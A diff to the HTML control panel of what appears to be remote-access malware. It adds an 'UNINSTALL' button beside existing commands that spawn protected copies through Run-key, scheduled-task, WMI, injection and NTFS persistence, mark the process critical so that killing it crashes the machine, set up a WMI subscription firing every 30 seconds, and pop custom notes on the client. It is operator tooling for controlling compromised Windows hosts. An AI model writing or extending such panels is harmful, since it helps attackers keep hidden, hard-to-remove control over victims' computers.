@@ -426,6 +426,7 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
 <button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copies <span>Auto-applies ALL layers: Run key, Task, WMI, Injection, NTFS — auto-protect after 15s</span></button>
 <button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Protect Now <span>Immediately mark this process CRITICAL (BSOD on kill)</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('UNINSTALL')">💀 UNINSTALL <span>Remove ALL persistence and kill all processes (no respawn)</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('UNPROTECT_PROCESS')">🔓 Unprotect Process <span>Remove critical flag from this client</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('CHECK_PROTECTION')">🛡️ Check Protection <span>Query if this process is critical (safe, no BSOD)</span></button>
 <button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('WMI_PERSISTENCE')">🔱 WMI Persistence <span>root/subscription: triggers every 30s</span></button>
